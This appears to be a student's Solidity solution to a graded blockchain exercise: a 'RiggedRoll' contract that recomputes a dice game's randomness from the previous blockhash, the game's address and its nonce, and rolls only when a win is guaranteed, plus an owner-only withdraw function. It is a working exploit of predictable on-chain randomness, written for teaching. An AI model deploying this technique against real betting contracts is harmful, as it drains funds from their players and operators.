pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    error DiceRollGreaterThan5();

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) external onlyOwner(){
        // uint256 contractBalance = address(this).balance;

        require(_amount > 0, "Invalid Withdrawal Amount");
        require(_addr != address(0), "Invalid Recipeint Address");
        // require(_amount < contractBalance, "Insufficient Contract Balance");

        uint256 withdrawAmount = _amount;

        (bool success, ) = _addr.call{value: withdrawAmount}("");
        require(success, "Transfer Failed");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether, "Contract balance is less than 0.002");
        //predict the roll
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 chash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));

        uint256 predictedRoll = uint256(chash) % 16;

        if(predictedRoll > 5){
            revert DiceRollGreaterThan5();
        }
        
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {

    }
}
